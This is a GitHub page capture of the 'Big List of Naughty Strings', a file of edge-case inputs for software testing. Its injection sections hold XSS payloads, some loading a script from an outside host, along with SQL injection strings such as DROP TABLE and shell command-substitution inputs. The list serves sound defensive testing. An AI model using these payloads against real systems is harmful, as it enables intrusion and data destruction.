// { "sha": "3b3e4f28d326b66b285603da58f31bcb801a7f5e" } 
Skip to content
Search or jump to…

Pull requests
Issues
Marketplace
Explore
 
@aralsto 
minimaxir
/
big-list-of-naughty-strings
9
810
35k1.5k
 Code Issues 44 Pull requests 17 Actions Projects 0 Wiki Security Insights
big-list-of-naughty-strings/blns.txtghghhj
@minimaxir minimaxir Merge branch 'master' into master
2f3806e on Dec 1, 2019
@minimaxir@jlennox@Plazmaz@zackw@Towerful@stuartpb@benpious@06b@netlovers@Maykeye@eedrah@greenjoe@charmander@Xe@topaz@pgrochowski@Miha-x64@sartak@romuald@RomainGehrig@rschoultz-wl@patch@radare@mikesamuel@joshuaduffy@lifengdvnera
732 lines (657 sloc)  28.7 KB
  
#	Reserved Strings
#
#	Strings which may be used elsewhere in code

undefined
undef
null
NULL
(null)
nil
NIL
true
false
True
False
TRUE
FALSE
None
hasOwnProperty
then
constructor

#	Numeric Strings
#
#	Strings which can be interpreted as numeric

0
1
1.00
$1.00
1/2
1E2
1E02
1E+02
-1
-1.00
-$1.00
-1/2
-1E2
-1E02
-1E+02
1/0
0/0
-2147483648/-1
-9223372036854775808/-1
-0
-0.0
+0
+0.0
0.00
0..0
.
0.0.0
0,00
0,,0
,
0,0,0
0.0/0
1.0/0.0
0.0/0.0
1,0/0,0
0,0/0,0
--1
-
-.
-,
999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
NaN
Infinity
-Infinity
INF
1#INF
-1#IND
1#QNAN
1#SNAN
1#IND
0x0
0xffffffff
0xffffffffffffffff
0xabad1dea
123456789012345678901234567890123456789
1,000.00
1 000.00
1'000.00
1,000,000.00
1 000 000.00
1'000'000.00
1.000,00
1 000,00
1'000,00
1.000.000,00
1 000 000,00
1'000'000,00
01000
08
09
2.2250738585072011e-308

#	Special Characters
#
# ASCII punctuation.  All of these characters may need to be escaped in some
# contexts.  Divided into three groups based on (US-layout) keyboard position.

,./;'[]-=
<>?:"{}|_+
!@#$%^&*()`~

# Non-whitespace C0 controls: U+0001 through U+0008, U+000E through U+001F,
# and U+007F (DEL)
# Often forbidden to appear in various text-based file formats (e.g. XML),
# or reused for internal delimiters on the theory that they should never
# appear in input.
# The next line may appear to be blank or mojibake in some viewers.


# Non-whitespace C1 controls: U+0080 through U+0084 and U+0086 through U+009F.
# Commonly misinterpreted as additional graphic characters.
# The next line may appear to be blank, mojibake, or dingbats in some viewers.


# Whitespace: all of the characters with category Zs, Zl, or Zp (in Unicode
# version 8.0.0), plus U+0009 (HT), U+000B (VT), U+000C (FF), U+0085 (NEL),
# and U+200B (ZERO WIDTH SPACE), which are in the C categories but are often
# treated as whitespace in some contexts.
# This file unfortunately cannot express strings containing
# U+0000, U+000A, or U+000D (NUL, LF, CR).
# The next line may appear to be blank or mojibake in some viewers.
# The next line may be flagged for "trailing whitespace" in some viewers.
	              ​    　

# Unicode additional control characters: all of the characters with
# general category Cf (in Unicode 8.0.0).
# The next line may appear to be blank or mojibake in some viewers.
­؀؁؂؃؄؅؜۝܏᠎​‌‍‎‏‪‫‬‭‮⁠⁡⁢⁣⁤⁦⁧⁨⁩⁪⁫⁬⁭⁮⁯﻿￹￺￻𑂽𛲠𛲡𛲢𛲣𝅳𝅴𝅵𝅶𝅷𝅸𝅹𝅺󠀁󠀠󠀡󠀢󠀣󠀤󠀥󠀦󠀧󠀨󠀩󠀪󠀫󠀬󠀭󠀮󠀯󠀰󠀱󠀲󠀳󠀴󠀵󠀶󠀷󠀸󠀹󠀺󠀻󠀼󠀽󠀾󠀿󠁀󠁁󠁂󠁃󠁄󠁅󠁆󠁇󠁈󠁉󠁊󠁋󠁌󠁍󠁎󠁏󠁐󠁑󠁒󠁓󠁔󠁕󠁖󠁗󠁘󠁙󠁚󠁛󠁜󠁝󠁞󠁟󠁠󠁡󠁢󠁣󠁤󠁥󠁦󠁧󠁨󠁩󠁪󠁫󠁬󠁭󠁮󠁯󠁰󠁱󠁲󠁳󠁴󠁵󠁶󠁷󠁸󠁹󠁺󠁻󠁼󠁽󠁾󠁿

# "Byte order marks", U+FEFF and U+FFFE, each on its own line.
# The next two lines may appear to be blank or mojibake in some viewers.
﻿
￾

#	Unicode Symbols
#
#	Strings which contain common unicode symbols (e.g. smart quotes)

Ω≈ç√∫˜µ≤≥÷
åß∂ƒ©˙∆˚¬…æ
œ∑´®†¥¨ˆøπ“‘
¡™£¢∞§¶•ªº–≠
¸˛Ç◊ı˜Â¯˘¿
ÅÍÎÏ˝ÓÔÒÚÆ☃
Œ„´‰ˇÁ¨ˆØ∏”’
`⁄€‹›ﬁﬂ‡°·‚—±
⅛⅜⅝⅞
ЁЂЃЄЅІЇЈЉЊЋЌЍЎЏАБВГДЕЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯабвгдежзийклмнопрстуфхцчшщъыьэюя
٠١٢٣٤٥٦٧٨٩

#	Unicode Subscript/Superscript/Accents
#
#	Strings which contain unicode subscripts/superscripts; can cause rendering issues

⁰⁴⁵
₀₁₂
⁰⁴⁵₀₁₂
ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็ ด้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็็้้้้้้้้็็็็็้้้้้็็็็

#	Quotation Marks
#
#	Strings which contain misplaced quotation marks; can cause encoding errors

'
"
''
""
'"'
"''''"'"
"'"'"''''"
<foo val=“bar” />
<foo val=“bar” />
<foo val=”bar“ />
<foo val=`bar' />

#	Two-Byte Characters
#
#	Strings which contain two-byte characters: can cause rendering issues or character-length issues

田中さんにあげて下さい
パーティーへ行かないか
和製漢語
部落格
사회과학원 어학연구소
찦차를 타고 온 펲시맨과 쑛다리 똠방각하
社會科學院語學研究所
울란바토르
𠜎𠜱𠝹𠱓𠱸𠲖𠳏

#	Strings which contain two-byte letters: can cause issues with naïve UTF-16 capitalizers which think that 16 bits == 1 character

𐐜 𐐔𐐇𐐝𐐀𐐡𐐇𐐓 𐐙𐐊𐐡𐐝𐐓/𐐝𐐇𐐗𐐊𐐤𐐔 𐐒𐐋𐐗 𐐒𐐌 𐐜 𐐡𐐀𐐖𐐇𐐤𐐓𐐝 𐐱𐑂 𐑄 𐐔𐐇𐐝𐐀𐐡𐐇𐐓 𐐏𐐆𐐅𐐤𐐆𐐚𐐊𐐡𐐝𐐆𐐓𐐆

#	Special Unicode Characters Union
#
#	A super string recommended by VMware Inc. Globalization Team: can effectively cause rendering issues or character-length issues to validate product globalization readiness.
#
#	表          CJK_UNIFIED_IDEOGRAPHS (U+8868)
#	ポ          KATAKANA LETTER PO (U+30DD)
#	あ          HIRAGANA LETTER A (U+3042)
#	A           LATIN CAPITAL LETTER A (U+0041)
#	鷗          CJK_UNIFIED_IDEOGRAPHS (U+9DD7)
#	Œ           LATIN SMALL LIGATURE OE (U+0153) 
#	é           LATIN SMALL LETTER E WITH ACUTE (U+00E9)
#	Ｂ           FULLWIDTH LATIN CAPITAL LETTER B (U+FF22)
#	逍          CJK_UNIFIED_IDEOGRAPHS (U+900D)
#	Ü           LATIN SMALL LETTER U WITH DIAERESIS (U+00FC)
#	ß           LATIN SMALL LETTER SHARP S (U+00DF)
#	ª           FEMININE ORDINAL INDICATOR (U+00AA)
#	ą           LATIN SMALL LETTER A WITH OGONEK (U+0105)
#	ñ           LATIN SMALL LETTER N WITH TILDE (U+00F1)
#	丂          CJK_UNIFIED_IDEOGRAPHS (U+4E02)
#	㐀          CJK Ideograph Extension A, First (U+3400)
#	𠀀          CJK Ideograph Extension B, First (U+20000)

表ポあA鷗ŒéＢ逍Üßªąñ丂㐀𠀀

#	Changing length when lowercased
#
#	Characters which increase in length (2 to 3 bytes) when lowercased
#	Credit: https://twitter.com/jifa/status/625776454479970304

Ⱥ
Ⱦ

#	Japanese Emoticons
#
#	Strings which consists of Japanese-style emoticons which are popular on the web

ヽ༼ຈل͜ຈ༽ﾉ ヽ༼ຈل͜ຈ༽ﾉ
(｡◕ ∀ ◕｡)
｀ｨ(´∀｀∩
__ﾛ(,_,*)
・(￣∀￣)・:*:
ﾟ･✿ヾ╲(｡◕‿◕｡)╱✿･ﾟ
,。・:*:・゜’( ☻ ω ☻ )。・:*:・゜’
(╯°□°）╯︵ ┻━┻)
(ﾉಥ益ಥ）ﾉ﻿ ┻━┻
┬─┬ノ( º _ ºノ)
( ͡° ͜ʖ ͡°)
¯_(ツ)_/¯

#	Emoji
#
#	Strings which contain Emoji; should be the same behavior as two-byte characters, but not always

😍
👩🏽
👨‍🦰 👨🏿‍🦰 👨‍🦱 👨🏿‍🦱 🦹🏿‍♂️
👾 🙇 💁 🙅 🙆 🙋 🙎 🙍
🐵 🙈 🙉 🙊
❤️ 💔 💌 💕 💞 💓 💗 💖 💘 💝 💟 💜 💛 💚 💙
✋🏿 💪🏿 👐🏿 🙌🏿 👏🏿 🙏🏿
🚾 🆒 🆓 🆕 🆖 🆗 🆙 🏧
0️⃣ 1️⃣ 2️⃣ 3️⃣ 4️⃣ 5️⃣ 6️⃣ 7️⃣ 8️⃣ 9️⃣ 🔟

#       Regional Indicator Symbols
#
#       Regional Indicator Symbols can be displayed differently across
#       fonts, and have a number of special behaviors

🇺🇸🇷🇺🇸 🇦🇫🇦🇲🇸
🇺🇸🇷🇺🇸🇦🇫🇦🇲
🇺🇸🇷🇺🇸🇦

#	Unicode Numbers
#
#	Strings which contain unicode numbers; if the code is localized, it should see the input as numeric

１２３
١٢٣

#	Right-To-Left Strings
#
#	Strings which contain text that should be rendered RTL if possible (e.g. Arabic, Hebrew)

ثم نفس سقطت وبالتحديد،, جزيرتي باستخدام أن دنو. إذ هنا؟ الستار وتنصيب كان. أهّل ايطاليا، بريطانيا-فرنسا قد أخذ. سليمان، إتفاقية بين ما, يذكر الحدود أي بعد, معاملة بولندا، الإطلاق عل إيو.
בְּרֵאשִׁית, בָּרָא אֱלֹהִים, אֵת הַשָּׁמַיִם, וְאֵת הָאָרֶץ
הָיְתָהtestالصفحات التّحول
﷽
ﷺ
مُنَاقَشَةُ سُبُلِ اِسْتِخْدَامِ اللُّغَةِ فِي النُّظُمِ الْقَائِمَةِ وَفِيم يَخُصَّ التَّطْبِيقَاتُ الْحاسُوبِيَّةُ،
الكل في المجمو عة (5)

#	Ogham Text
#
#	The only unicode alphabet to use a space which isn't empty but should still act like a space.

᚛ᚄᚓᚐᚋᚒᚄ ᚑᚄᚂᚑᚏᚅ᚜
᚛                 ᚜

#	Trick Unicode
#
#	Strings which contain unicode with unusual properties (e.g. Right-to-left override) (c.f. http://www.unicode.org/charts/PDF/U2000.pdf)

‪‪test‪
‫test‫
 test 
test⁠test‫
⁦test⁧

#	Zalgo Text
#
#	Strings which contain "corrupted" text. The corruption will not appear in non-HTML text, however. (via http://www.eeemo.net)

Ṱ̺̺̕o͞ ̷i̲̬͇̪͙n̝̗͕v̟̜̘̦͟o̶̙̰̠kè͚̮̺̪̹̱̤ ̖t̝͕̳̣̻̪͞h̼͓̲̦̳̘̲e͇̣̰̦̬͎ ̢̼̻̱̘h͚͎͙̜̣̲ͅi̦̲̣̰̤v̻͍e̺̭̳̪̰-m̢iͅn̖̺̞̲̯̰d̵̼̟͙̩̼̘̳ ̞̥̱̳̭r̛̗̘e͙p͠r̼̞̻̭̗e̺̠̣͟s̘͇̳͍̝͉e͉̥̯̞̲͚̬͜ǹ̬͎͎̟̖͇̤t͍̬̤͓̼̭͘ͅi̪̱n͠g̴͉ ͏͉ͅc̬̟h͡a̫̻̯͘o̫̟̖͍̙̝͉s̗̦̲.̨̹͈̣
̡͓̞ͅI̗̘̦͝n͇͇͙v̮̫ok̲̫̙͈i̖͙̭̹̠̞n̡̻̮̣̺g̲͈͙̭͙̬͎ ̰t͔̦h̞̲e̢̤ ͍̬̲͖f̴̘͕̣è͖ẹ̥̩l͖͔͚i͓͚̦͠n͖͍̗͓̳̮g͍ ̨o͚̪͡f̘̣̬ ̖̘͖̟͙̮c҉͔̫͖͓͇͖ͅh̵̤̣͚͔á̗̼͕ͅo̼̣̥s̱͈̺̖̦̻͢.̛̖̞̠̫̰
̗̺͖̹̯͓Ṯ̤͍̥͇͈h̲́e͏͓̼̗̙̼̣͔ ͇̜̱̠͓͍ͅN͕͠e̗̱z̘̝̜̺͙p̤̺̹͍̯͚e̠̻̠͜r̨̤͍̺̖͔̖̖d̠̟̭̬̝͟i̦͖̩͓͔̤a̠̗̬͉̙n͚͜ ̻̞̰͚ͅh̵͉i̳̞v̢͇ḙ͎͟-҉̭̩̼͔m̤̭̫i͕͇̝̦n̗͙ḍ̟ ̯̲͕͞ǫ̟̯̰̲͙̻̝f ̪̰̰̗̖̭̘͘c̦͍̲̞͍̩̙ḥ͚a̮͎̟̙͜ơ̩̹͎s̤.̝̝ ҉Z̡̖̜͖̰̣͉̜a͖̰͙̬͡l̲̫̳͍̩g̡̟̼̱͚̞̬ͅo̗͜.̟
̦H̬̤̗̤͝e͜ ̜̥̝̻͍̟́w̕h̖̯͓o̝͙̖͎̱̮ ҉̺̙̞̟͈W̷̼̭a̺̪͍į͈͕̭͙̯̜t̶̼̮s̘͙͖̕ ̠̫̠B̻͍͙͉̳ͅe̵h̵̬͇̫͙i̹͓̳̳̮͎̫̕n͟d̴̪̜̖ ̰͉̩͇͙̲͞ͅT͖̼͓̪͢h͏͓̮̻e̬̝̟ͅ ̤̹̝W͙̞̝͔͇͝ͅa͏͓͔̹̼̣l̴͔̰̤̟͔ḽ̫.͕
Z̮̞̠͙͔ͅḀ̗̞͈̻̗Ḷ͙͎̯̹̞͓G̻O̭̗̮

#	Unicode Upsidedown
#
#	Strings which contain unicode with an "upsidedown" effect (via http://www.upsidedowntext.com)

˙ɐnbᴉlɐ ɐuƃɐɯ ǝɹolop ʇǝ ǝɹoqɐl ʇn ʇunpᴉpᴉɔuᴉ ɹodɯǝʇ poɯsnᴉǝ op pǝs 'ʇᴉlǝ ƃuᴉɔsᴉdᴉpɐ ɹnʇǝʇɔǝsuoɔ 'ʇǝɯɐ ʇᴉs ɹolop ɯnsdᴉ ɯǝɹo˥
00˙Ɩ$-

#	Unicode font
#
#	Strings which contain bold/italic/etc. versions of normal characters

Ｔｈｅ ｑｕｉｃｋ ｂｒｏｗｎ ｆｏｘ ｊｕｍｐｓ ｏｖｅｒ ｔｈｅ ｌａｚｙ ｄｏｇ
𝐓𝐡𝐞 𝐪𝐮𝐢𝐜𝐤 𝐛𝐫𝐨𝐰𝐧 𝐟𝐨𝐱 𝐣𝐮𝐦𝐩𝐬 𝐨𝐯𝐞𝐫 𝐭𝐡𝐞 𝐥𝐚𝐳𝐲 𝐝𝐨𝐠
𝕿𝖍𝖊 𝖖𝖚𝖎𝖈𝖐 𝖇𝖗𝖔𝖜𝖓 𝖋𝖔𝖝 𝖏𝖚𝖒𝖕𝖘 𝖔𝖛𝖊𝖗 𝖙𝖍𝖊 𝖑𝖆𝖟𝖞 𝖉𝖔𝖌
𝑻𝒉𝒆 𝒒𝒖𝒊𝒄𝒌 𝒃𝒓𝒐𝒘𝒏 𝒇𝒐𝒙 𝒋𝒖𝒎𝒑𝒔 𝒐𝒗𝒆𝒓 𝒕𝒉𝒆 𝒍𝒂𝒛𝒚 𝒅𝒐𝒈
𝓣𝓱𝓮 𝓺𝓾𝓲𝓬𝓴 𝓫𝓻𝓸𝔀𝓷 𝓯𝓸𝔁 𝓳𝓾𝓶𝓹𝓼 𝓸𝓿𝓮𝓻 𝓽𝓱𝓮 𝓵𝓪𝔃𝔂 𝓭𝓸𝓰
𝕋𝕙𝕖 𝕢𝕦𝕚𝕔𝕜 𝕓𝕣𝕠𝕨𝕟 𝕗𝕠𝕩 𝕛𝕦𝕞𝕡𝕤 𝕠𝕧𝕖𝕣 𝕥𝕙𝕖 𝕝𝕒𝕫𝕪 𝕕𝕠𝕘
𝚃𝚑𝚎 𝚚𝚞𝚒𝚌𝚔 𝚋𝚛𝚘𝚠𝚗 𝚏𝚘𝚡 𝚓𝚞𝚖𝚙𝚜 𝚘𝚟𝚎𝚛 𝚝𝚑𝚎 𝚕𝚊𝚣𝚢 𝚍𝚘𝚐
⒯⒣⒠ ⒬⒰⒤⒞⒦ ⒝⒭⒪⒲⒩ ⒡⒪⒳ ⒥⒰⒨⒫⒮ ⒪⒱⒠⒭ ⒯⒣⒠ ⒧⒜⒵⒴ ⒟⒪⒢

#	Script Injection
#
#	Strings which attempt to invoke a benign script injection; shows vulnerability to XSS

<script>alert(123)</script>
&lt;script&gt;alert(&#39;123&#39;);&lt;/script&gt;
<img src=x onerror=alert(123) />
<svg><script>123<1>alert(123)</script>
"><script>alert(123)</script>
'><script>alert(123)</script>
><script>alert(123)</script>
</script><script>alert(123)</script>
< / script >< script >alert(123)< / script >
 onfocus=JaVaSCript:alert(123) autofocus
" onfocus=JaVaSCript:alert(123) autofocus
' onfocus=JaVaSCript:alert(123) autofocus
＜script＞alert(123)＜/script＞
<sc<script>ript>alert(123)</sc</script>ript>
--><script>alert(123)</script>
";alert(123);t="
';alert(123);t='
JavaSCript:alert(123)
;alert(123);
src=JaVaSCript:prompt(132)
"><script>alert(123);</script x="
'><script>alert(123);</script x='
><script>alert(123);</script x=
" autofocus onkeyup="javascript:alert(123)
' autofocus onkeyup='javascript:alert(123)
<script type="text/javascript">javascript:alert(1);</script>
<script>type="text/javascript">javascript:alert(1);</script>
<script
type="text/javascript">javascript:alert(1);</script>
<script	type="text/javascript">javascript:alert(1);</script>
<scripttype="text/javascript">javascript:alert(1);</script>
<script/type="text/javascript">javascript:alert(1);</script>
<script
type="text/javascript">javascript:alert(1);</script>
'`"><<script>javascript:alert(1)</script>
'`">< script>javascript:alert(1)</script>
ABC<div style="x:expression(javascript:alert(1)">DEF
ABC<div style="x:expression(javascript:alert(1)">DEF
ABC<div style="x:expression (javascript:alert(1)">DEF
ABC<div style="x:exp ression(javascript:alert(1)">DEF
ABC<div style="x:exp
ession(javascript:alert(1)">DEF
ABC<div style="x:
expression(javascript:alert(1)">DEF
ABC<div style="x:	expression(javascript:alert(1)">DEF
ABC<div style="x:ãexpression(javascript:alert(1)">DEF
ABC<div style="x:âexpression(javascript:alert(1)">DEF
ABC<div style="x:Â expression(javascript:alert(1)">DEF
ABC<div style="x:âexpression(javascript:alert(1)">DEF
ABC<div style="x:âexpression(javascript:alert(1)">DEF
ABC<div style="x:
expression(javascript:alert(1)">DEF
ABC<div style="x:expression(javascript:alert(1)">DEF
ABC<div style="x:âexpression(javascript:alert(1)">DEF
ABC<div style="x:ï»¿expression(javascript:alert(1)">DEF
ABC<div style="x: expression(javascript:alert(1)">DEF
ABC<div style="x:âexpression(javascript:alert(1)">DEF
ABC<div style="x: expression(javascript:alert(1)">DEF
ABC<div style="x:âexpression(javascript:alert(1)">DEF
ABC<div style="x:âexpression(javascript:alert(1)">DEF
ABC<div style="x:âexpression(javascript:alert(1)">DEF
ABC<div style="x:âexpression(javascript:alert(1)">DEF
ABC<div style="x:expression(javascript:alert(1)">DEF
ABC<div style="x:âexpression(javascript:alert(1)">DEF
ABC<div style="x:âexpression(javascript:alert(1)">DEF
ABC<div style="x:âexpression(javascript:alert(1)">DEF
<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="Â javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="á javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="âjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="âjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="âjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href=" javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="âjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href=" javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="	javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="âjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="â¯javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="âjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="âjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="ájavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="âjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="âjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="âjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="ãjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="
javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="
javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="â¨javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="â©javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="âjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="âjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript :javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript::javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript	:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript
:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javascript
:javascript:alert(1)" id="fuzzelement1">test</a>
`"'><img src=xxx:x 
onerror=javascript:alert(1)>
`"'><img src=xxx:x "onerror=javascript:alert(1)>
`"'><img src=xxx:x onerror=javascript:alert(1)>
`"'><img src=xxx:x 
onerror=javascript:alert(1)>
`"'><img src=xxx:x /onerror=javascript:alert(1)>
`"'><img src=xxx:x 	onerror=javascript:alert(1)>
`"'><img src=xxx:x onerror=javascript:alert(1)>
`"'><img src=xxx:x  onerror=javascript:alert(1)>
`"'><img src=xxx:x 'onerror=javascript:alert(1)>
`"'><img src=xxx:x  onerror=javascript:alert(1)>
"`'><script>;javascript:alert(1)</script>
"`'><script>
javascript:alert(1)</script>
"`'><script>ï»¿javascript:alert(1)</script>
"`'><script>âjavascript:alert(1)</script>
"`'><script>âjavascript:alert(1)</script>
"`'><script>ãjavascript:alert(1)</script>
"`'><script>	javascript:alert(1)</script>
"`'><script>âjavascript:alert(1)</script>
"`'><script>âjavascript:alert(1)</script>
"`'><script>âjavascript:alert(1)</script>
"`'><script> javascript:alert(1)</script>
"`'><script>â¨javascript:alert(1)</script>
"`'><script>âjavascript:alert(1)</script>
"`'><script>ájavascript:alert(1)</script>
"`'><script>javascript:alert(1)</script>
"`'><script>+javascript:alert(1)</script>
"`'><script>ðjavascript:alert(1)</script>
"`'><script>-javascript:alert(1)</script>
"`'><script>
javascript:alert(1)</script>
"`'><script>â¯javascript:alert(1)</script>
"`'><script>~javascript:alert(1)</script>
"`'><script>âjavascript:alert(1)</script>
"`'><script>âjavascript:alert(1)</script>
"`'><script>â©javascript:alert(1)</script>
"`'><script>Âjavascript:alert(1)</script>
"`'><script>ï¿®javascript:alert(1)</script>
"`'><script>âjavascript:alert(1)</script>
"`'><script>âjavascript:alert(1)</script>
"`'><script>ï¿¾javascript:alert(1)</script>
"`'><script>âjavascript:alert(1)</script>
"`'><script>!javascript:alert(1)</script>
"`'><script>âjavascript:alert(1)</script>
"`'><script>âjavascript:alert(1)</script>
"`'><script>á javascript:alert(1)</script>
"`'><script>javascript:alert(1)</script>
"`'><script> javascript:alert(1)</script>
"`'><script>Â javascript:alert(1)</script>
<img  src=x onerror="alert(1)">
<img Gsrc=x onerror="javascript:alert(1)">
<img src=x onerror="javascript:alert(1)">
<img src=x onerror="javascript:alert(1)">
<imgGsrc=x onerror="javascript:alert(1)">
<imgsrc=x onerror="javascript:alert(1)">
<imgsrc=x onerror="javascript:alert(1)">
<img2src=x onerror="javascript:alert(1)">
<imgGsrc=x onerror="javascript:alert(1)">
<imgsrc=x onerror="javascript:alert(1)">
<img Gsrc=x onerror="javascript:alert(1)">
<img 4src=x onerror="javascript:alert(1)">
<img 9src=x onerror="javascript:alert(1)">
<img  src=x onerror="javascript:alert(1)">
<img src	=x onerror="javascript:alert(1)">
<img src=x onerror="javascript:alert(1)">
<img src=x onerror="javascript:alert(1)">
<img src2=x onerror="javascript:alert(1)">
<img src=x onerror="javascript:alert(1)">
<img src=x onerror="javascript:alert(1)">
<img src =x onerror="javascript:alert(1)">
<img srcG=x onerror="javascript:alert(1)">
<img src=x	onerror="javascript:alert(1)">
<img src=xonerror="javascript:alert(1)">
<img src=xonerror="javascript:alert(1)">
<img src=xonerror="javascript:alert(1)">
<img src=xonerror="javascript:alert(1)">
<img[a][b][c]src[d]=x[e]onerror=[f]"alert(1)">
<img src=x onerror=	"javascript:alert(1)">
<img src=x onerror="javascript:alert(1)">
<img src=x onerror="javascript:alert(1)">
<img src=x onerror="javascript:alert(1)">
<img src=x onerror=2"javascript:alert(1)">
<img src=x onerror= "javascript:alert(1)">
<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>
<img src="x` `<script>javascript:alert(1)</script>"` `>
<img src onerror /" '"= alt=javascript:alert(1)//">
<title onpropertychange=javascript:alert(1)></title><title title=>
<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:alert(1)></a>">
<!--[if]><script>javascript:alert(1)</script -->
<!--[if<img src=x onerror=javascript:alert(1)//]> -->
<script src="/%(jscript)s"></script>
<script src="%(jscript)s"></script>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
<IMG SRC=# onmouseover="alert('xxs')">
<IMG SRC= onmouseover="alert('xxs')">
<IMG onmouseover="alert('xxs')">
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
<IMG SRC="jav   ascript:alert('XSS');">
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
perl -e 'print "<IMG SRC=java script:alert("XSS")>";' > out
<IMG SRC=" &#14;  javascript:alert('XSS');">
<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<BODY onload!#$%&()*~+-_.,:;?@[/|]^`=alert("XSS")>
<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
<<SCRIPT>alert("XSS");//<</SCRIPT>
<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
<SCRIPT SRC=//ha.ckers.org/.j>
<IMG SRC="javascript:alert('XSS')"
<iframe src=http://ha.ckers.org/scriptlet.html <
";alert('XSS');//
<u oncopy=alert()> Copy me</u>
<i onwheel=alert(1)> Scroll over me </i>
<plaintext>
http://a/%%30%30
</textarea><script>alert(123)</script>

#	SQL Injection
#
#	Strings which can cause a SQL injection if inputs are not sanitized

1;DROP TABLE users
1'; DROP TABLE users-- 1
' OR 1=1 -- 1
' OR '1'='1
 
%
_

#	Server Code Injection
#
#	Strings which can cause user to run code on server as a privileged user (c.f. https://news.ycombinator.com/item?id=7665153)

-
--
--version
--help
$USER
/dev/null; touch /tmp/blns.fail ; echo
`touch /tmp/blns.fail`
$(touch /tmp/blns.fail)
